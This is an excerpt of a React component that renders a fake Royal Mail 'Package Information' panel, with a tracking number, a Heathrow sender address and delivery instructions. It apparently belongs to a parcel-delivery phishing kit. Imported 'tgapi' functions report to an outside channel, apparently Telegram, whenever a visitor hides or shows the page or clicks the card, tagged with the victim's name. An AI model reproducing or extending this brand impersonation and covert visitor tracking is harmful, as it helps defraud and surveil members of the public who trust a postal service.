...
import { sendPageHiddenNotification, sendPageVisibleNotification, sendPackageInfoClickNotification } from "@/components/tgapi";
...
const PackageForm = ({ recipientData }: PackageFormProps) => {
  ...
  useEffect(() => {
    ...
    const handleVisibilityChange = () => {
      const clientIdentifier = recipientData?.name || "Unknown Client";
  ...
  }, [isDialogOpen, recipientData?.name]);
  ...
  const handleCardClick = async () => {
    ...
    const clientIdentifier = recipientData?.name || "Unknown Client";
    await sendPackageInfoClickNotification(clientIdentifier);
        ...
        <div className="px-2 pt-2 pb-2 transition-all duration-300">
          <CardTitle className="flex items-center text-sm transition-colors duration-300">
            ...
            <span className="transition-all duration-300 group-hover:translate-x-1">
              {isLoading ? 'Loading...' : 'Package Information'}
            </span>
          </CardTitle>
        </div>
      </Card>
            ...
            <div className="sticky top-0 z-10 bg-gradient-to-r from-primary to-primary-light p-4 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-primary to-primary-light border-2 border-red-500 rounded-sm px-3 py-0.5 shadow-lg">
                  <span className="text-gray-100 font-semibold text-xs">Package Information</span>
                </div>
              </div>
              {/* Close Button */}
              <button 
                                ...
                                <div className="bg-card p-3 rounded-lg border-4 border-white shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                                  ...
                                  <div className="mb-3 pb-2 border-b border-border/30">
                                    <div className="flex items-center justify-between">
                                      ...
                                      <span className="text-[9px] px-2 py-1 bg-primary/10 text-primary rounded-md font-medium shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">RM123456789GB</span>
                                    </div>
                                  </div>
                                  ...
                                  <div className="grid grid-cols-1 gap-2 mb-3">
                                    ...
                                    <div className="bg-muted/20 p-2 rounded">
                                      <div className="flex items-center justify-between mb-1">
                                        <span className="text-[8px] font-medium text-muted-foreground uppercase tracking-wider">Recipient</span>
                                    ...
                                    <div className="bg-muted/10 p-2 rounded">
                                      <div className="flex items-center justify-between mb-1">
                                        <span className="text-[8px] font-medium text-muted-foreground uppercase tracking-wider">Sender</span>
                                        <div className="w-1.5 h-1.5 bg-blue-500 rounded-full"></div>
                                      </div>
                                      <p className="text-[10px] font-medium text-foreground">Royal Mail Distribution</p>
                                      <p className="text-[9px] text-muted-foreground">Heathrow TW6 2RA</p>
                                    </div>
                                  </div>
                                  ...
                                  <div className="grid grid-cols-2 gap-2">
                                    <div className="bg-accent/10 p-4 rounded text-center shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                                      <span className="text-[8px] font-medium text-muted-foreground uppercase block">Weight</span>
                    ...
                    <div className="mt-6 p-4 bg-gradient-to-r from-muted/30 to-muted/10 rounded-xl border border-border/50 border-2 border-white shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                      <h4 className="text-xs font-semibold text-card-foreground mb-3 relative text-center">
                        <span className="relative inline-block">
                          <span className="relative z-10">Delivery Instructions</span>
                      ...
                      <ul className="text-[10px] text-muted-foreground space-y-2">
                        <li className="flex items-start space-x-2">
                          ...
                          <span className="relative inline-block">
                            <span className="relative z-10">Please ensure someone is available to receive the package</span>
                        ...
                        <li className="flex items-start space-x-2">
                          <span className="text-blue-500 font-bold">•</span>
                          <span className="relative inline-block">
                            <span className="relative z-10">ID may be required for verification</span>
                            <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                            <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
                            <div className="absolute -bottom-0.5 left-0 w-full h-px bg-gray-400/60 rounded-full blur-[1px]"></div>
                          </span>
                        ...
                        <li className="flex items-start space-x-2 relative">
                          ...
                          <span className="relative">
                            <span className="relative z-10">Safe place options available if nobody is home</span>
                            <div className="absolute top-1 left-1/4 w-1/2 h-0.5 bg-gray-400/30 rounded-full blur-sm"></div>
                            <div className="absolute top-1.5 left-1/3 w-1/3 h-1 bg-gray-300/20 rounded-full blur-md"></div>
